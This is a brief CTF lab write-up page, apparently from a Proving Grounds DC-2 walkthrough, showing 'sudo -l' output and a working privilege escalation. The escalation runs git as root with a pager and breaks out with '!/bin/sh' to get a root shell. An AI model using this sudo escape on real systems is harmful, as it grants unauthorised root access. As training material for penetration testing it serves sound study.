---
layout: default
title: Git
parent: Sudo
nav_order: 2
---

# Git

---

## Check Sudo -l

```bash
jerry@DC-2:/home/tom$ sudo -l
Matching Defaults entries for jerry on DC-2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git

```

## Exploit SUDO Permissions on Git Binary (Privesc Through Pagination)

![sudo](../../../../assets/images/ctfs/proving_grounds/dc-2/sudo.png)

```bash
jerry@DC-2:/home/tom$ sudo /usr/bin/git -p help config


# Break out of Git
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)

```
